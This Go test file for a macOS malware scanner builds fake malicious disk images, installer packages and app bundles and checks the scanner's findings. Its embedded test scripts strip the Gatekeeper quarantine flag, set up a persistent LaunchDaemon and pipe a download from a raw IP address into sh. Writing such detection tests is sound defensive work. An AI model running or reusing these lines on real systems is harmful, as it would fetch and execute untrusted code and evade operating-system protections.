package container

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/danczar/binchk/internal/analyze"
)

func run(t *testing.T, name string, args ...string) {
	t.Helper()
	if out, err := exec.Command(name, args...).CombinedOutput(); err != nil {
		t.Fatalf("%s %v: %v\n%s", name, args, err, out)
	}
}

func evilBinary(t *testing.T, dir string) string {
	t.Helper()
	p := filepath.Join(dir, "evil-bin")
	cmd := exec.Command("go", "build", "-o", p, "./evil")
	cmd.Dir = "../analyze/testdata"
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	return p
}

func makeApp(t *testing.T, dir, name, exe string) string {
	t.Helper()
	app := filepath.Join(dir, name+".app")
	os.MkdirAll(filepath.Join(app, "Contents/MacOS"), 0o755)
	run(t, "cp", exe, filepath.Join(app, "Contents/MacOS", name))
	os.WriteFile(filepath.Join(app, "Contents/Info.plist"), []byte(`<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>CFBundleExecutable</key><string>`+name+`</string>
<key>CFBundleIdentifier</key><string>com.example.`+strings.ToLower(name)+`</string>
<key>CFBundleShortVersionString</key><string>1.2.3</string>
<key>LSUIElement</key><true/>
</dict></plist>`), 0o644)
	run(t, "codesign", "--force", "--sign", "-", app) // ad-hoc, like most Mac malware
	return app
}

func makeDMG(t *testing.T, src, out string) {
	t.Helper()
	run(t, "hdiutil", "create", "-quiet", "-srcfolder", src, "-volname", "Test", "-format", "UDZO", "-ov", out)
}

func engine(t *testing.T) *analyze.Engine {
	e, err := analyze.NewEngine(analyze.Options{Budget: 12 * time.Second, VerifySignatures: true})
	if err != nil {
		t.Fatal(err)
	}
	return e
}

func ids(r *analyze.Report) map[string]analyze.Severity {
	m := map[string]analyze.Severity{}
	for _, f := range r.Findings {
		m[f.ID] = f.Severity
	}
	return m
}

// waitDetached fails if an image stays attached after inspection.
func waitDetached(t *testing.T, img string) {
	t.Helper()
	for i := 0; i < 50; i++ {
		out, _ := exec.Command("hdiutil", "info").Output()
		if !strings.Contains(string(out), img) {
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Errorf("%s still attached", img)
}

func TestDMGWithSuspiciousApp(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	bin := evilBinary(t, d)
	makeApp(t, src, "Installer", bin)
	os.WriteFile(filepath.Join(src, "Install.command"), []byte("#!/bin/bash\nxattr -d com.apple.quarantine /Applications/Installer.app\ncurl -fsSL http://45.77.10.20/x | sh\n"), 0o755)
	run(t, "cp", bin, filepath.Join(src, ".helper"))
	os.Symlink("/Applications", filepath.Join(src, "Applications"))
	img := filepath.Join(d, "evil.dmg")
	makeDMG(t, src, img)

	r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
	t.Logf("%s score=%d in %s: %s", r.Verdict, r.Score, r.Elapsed, r.Summary)
	if r.Format != "Apple disk image" || r.Container == nil {
		t.Fatalf("format %q container %v", r.Format, r.Container)
	}
	if r.Verdict != analyze.VerdictMalicious {
		t.Errorf("verdict %s", r.Verdict)
	}
	got := ids(r)
	for _, want := range []string{"gatekeeper-rejected", "dmg-script", "dmg-gatekeeper-bypass", "dmg-hidden-exec", "ransom-note", "stealer-wallets", "lolbin-download"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing %s", want)
		}
	}
	if len(r.Container.Bundles) != 1 || r.Container.Bundles[0].Path != "Installer.app" {
		t.Errorf("bundles: %+v", r.Container.Bundles)
	}
	if len(r.Container.Files) != 3 {
		t.Errorf("files: %d, want app exe + script + helper", len(r.Container.Files))
	}
	if r.Hashes.SHA256 == "" {
		t.Error("container not hashed")
	}
	waitDetached(t, img)
}

// TestDMGWithTrustedApp packages a real notarized app (set
// BINCHK_TRUSTED_APP=/Applications/Some.app) and expects a clean verdict.
// Apple's own /System apps can't be used: their seal is only valid in place.
func TestDMGWithTrustedApp(t *testing.T) {
	app := os.Getenv("BINCHK_TRUSTED_APP")
	if app == "" {
		t.Skip("set BINCHK_TRUSTED_APP to a notarized .app")
	}
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	run(t, "cp", "-R", app, filepath.Join(src, filepath.Base(app)))
	os.Symlink("/Applications", filepath.Join(src, "Applications"))
	img := filepath.Join(d, "trusted.dmg")
	makeDMG(t, src, img)
	r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
	t.Logf("%s score=%d in %s: %s; gatekeeper=%q signer=%q", r.Verdict, r.Score, r.Elapsed, r.Summary, r.Signature.Gatekeeper, r.Signature.Signer)
	if r.Verdict != analyze.VerdictClean {
		t.Errorf("verdict %s: %+v", r.Verdict, r.Findings)
	}
	if r.Signature.Verified == nil || !*r.Signature.Verified || !r.Signature.Notarized {
		t.Errorf("expected verified + notarized: %+v", r.Signature)
	}
	waitDetached(t, img)
}

func TestEncryptedDMG(t *testing.T) {
	d := t.TempDir()
	src := filepath.Join(d, "src")
	os.MkdirAll(src, 0o755)
	os.WriteFile(filepath.Join(src, "a.txt"), []byte("x"), 0o644)
	img := filepath.Join(d, "enc.dmg")
	cmd := exec.Command("hdiutil", "create", "-quiet", "-srcfolder", src, "-encryption", "AES-128", "-stdinpass", "-format", "UDZO", img)
	cmd.Stdin = strings.NewReader("secret")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v %s", err, out)
	}
	start := time.Now()
	r := Analyze(context.Background(), engine(t), img, analyze.Meta{})
	if _, ok := ids(r)["dmg-encrypted"]; !ok {
		t.Errorf("findings %+v", r.Findings)
	}
	if time.Since(start) > 3*time.Second {
		t.Errorf("encrypted image took %s (password prompt?)", time.Since(start))
	}
}

func TestInstallerPackage(t *testing.T) {
	d := t.TempDir()
	bin := evilBinary(t, d)
	root := filepath.Join(d, "root")
	os.MkdirAll(filepath.Join(root, "Library/LaunchDaemons"), 0o755)
	os.MkdirAll(filepath.Join(root, "usr/local/bin"), 0o755)
	run(t, "cp", bin, filepath.Join(root, "usr/local/bin/updater"))
	os.WriteFile(filepath.Join(root, "Library/LaunchDaemons/com.example.updater.plist"), []byte(`<plist><dict><key>Label</key><string>com.example.updater</string><key>RunAtLoad</key><true/><key>KeepAlive</key><true/></dict></plist>`), 0o644)
	scripts := filepath.Join(d, "scripts")
	os.MkdirAll(scripts, 0o755)
	os.WriteFile(filepath.Join(scripts, "postinstall"), []byte("#!/bin/sh\nlaunchctl load /Library/LaunchDaemons/com.example.updater.plist\ncurl -fsSL http://45.77.10.20/x | sh\n"), 0o755)
	pkg := filepath.Join(d, "Setup.pkg")
	run(t, "pkgbuild", "--root", root, "--scripts", scripts, "--identifier", "com.example.updater", "--version", "1", "--install-location", "/", pkg)

	r := Analyze(context.Background(), engine(t), pkg, analyze.Meta{})
	t.Logf("%s score=%d in %s: %s", r.Verdict, r.Score, r.Elapsed, r.Summary)
	got := ids(r)
	for _, want := range []string{"pkg-unsigned", "pkg-scripts", "pkg-launchd", "lolbin-download", "ransom-note"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing %s; have %v", want, got)
		}
	}
	if r.Verdict != analyze.VerdictMalicious {
		t.Errorf("verdict %s", r.Verdict)
	}
	if len(r.Container.Bundles) == 0 || r.Container.Bundles[0].Kind != "Installer package" {
		t.Errorf("bundles %+v", r.Container.Bundles)
	}
}

func TestStandaloneApp(t *testing.T) {
	d := t.TempDir()
	app := makeApp(t, d, "Free VPN", evilBinary(t, d))
	r := Analyze(context.Background(), engine(t), app, analyze.Meta{})
	t.Logf("%s score=%d in %s: %s", r.Verdict, r.Score, r.Elapsed, r.Summary)
	if r.Format != "Application bundle" || r.Container == nil {
		t.Fatalf("format %q", r.Format)
	}
	got := ids(r)
	for _, want := range []string{"gatekeeper-rejected", "ransom-note", "stealer-wallets"} {
		if _, ok := got[want]; !ok {
			t.Errorf("missing %s", want)
		}
	}
	if r.Verdict != analyze.VerdictMalicious {
		t.Errorf("verdict %s", r.Verdict)
	}
	if r.Hashes.SHA256 == "" || r.Size == 0 {
		t.Errorf("hash %q size %d", r.Hashes.SHA256, r.Size)
	}
}

// TestAdHocAppEngineNotDemoted: a genuine, vendor-signed Electron framework
// inside an app whose own seal carries no developer identity (ad-hoc, like
// most Mac malware) must not earn the browser-engine demotion, because the
// bundle verification vouches for no one. Skips without an Electron app;
// TestSealTrusted and TestSealGateResolve cover the gate hermetically.
func TestAdHocAppEngineNotDemoted(t *testing.T) {
	if testing.Short() {
		t.Skip("copies and reads a large framework")
	}
	fw, _ := filepath.Glob("/Applications/*.app/Contents/Frameworks/Electron Framework.framework")
	if len(fw) == 0 {
		t.Skip("no Electron app installed")
	}
	d := t.TempDir()
	main := filepath.Join(d, "main")
	cmd := exec.Command("go", "build", "-o", main, "./benign")
	cmd.Dir = "../analyze/testdata"
	cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("%v\n%s", err, out)
	}
	src := filepath.Join(d, "src")
	os.MkdirAll(filepath.Join(src, "Helper.app/Contents/Frameworks"), 0o755)
	dst := filepath.Join(src, "Helper.app/Contents/Frameworks", filepath.Base(fw[0]))
	if exec.Command("cp", "-cR", fw[0], dst).Run() != nil { // clone when possible
		os.RemoveAll(dst)
		run(t, "cp", "-R", fw[0], dst)
	}
	app := makeApp(t, src, "Helper", main) // ad-hoc signs the outer bundle

	eng, err := analyze.NewEngine(analyze.Options{Budget: 2 * time.Minute, VerifySignatures: true})
	if err != nil {
		t.Fatal(err)
	}
	r := Analyze(context.Background(), eng, app, analyze.Meta{})
	t.Logf("%s score=%d in %s: %s", r.Verdict, r.Score, r.Elapsed, r.Summary)
	found := false
	for _, f := range r.Container.Files {
		if !strings.HasSuffix(f.Path, "/Electron Framework") {
			continue
		}
		for _, x := range f.Findings {
			switch x.ID {
			case "stealer-cred-files", "api-keylogging", "api-priv-exec-mac":
				found = true
				if x.Severity == analyze.Info {
					t.Errorf("%s demoted to info inside an ad-hoc app", x.ID)
				}
			}
		}
	}
	if !found {
		t.Fatalf("framework not analysed or has no engine findings: %+v", r.Container.Files)
	}
}
